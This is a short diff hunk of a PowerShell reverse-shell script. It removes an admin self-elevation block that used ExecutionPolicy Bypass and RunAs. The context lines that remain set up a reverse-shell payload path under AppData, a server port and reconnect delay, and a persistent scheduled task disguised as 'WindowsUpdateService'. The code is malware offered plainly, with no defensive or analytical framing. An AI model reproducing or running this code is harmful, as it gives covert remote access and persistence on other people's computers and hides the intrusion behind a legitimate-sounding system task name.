@@ -4,13 +4,6 @@ $serverPort = 47034
 $reconnectDelay = 15
 $localPayloadPath = "$env:APPDATA\Microsoft\Windows\reverse_shell.ps1"
 
-# Self-elevate to admin if not already
-if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    $arguments = "-ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Definition)`""
-    Start-Process powershell.exe -ArgumentList $arguments -Verb RunAs
-    exit
-}
-
 # Install persistent scheduled task if not exists
 $taskName = "WindowsUpdateService"
 if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
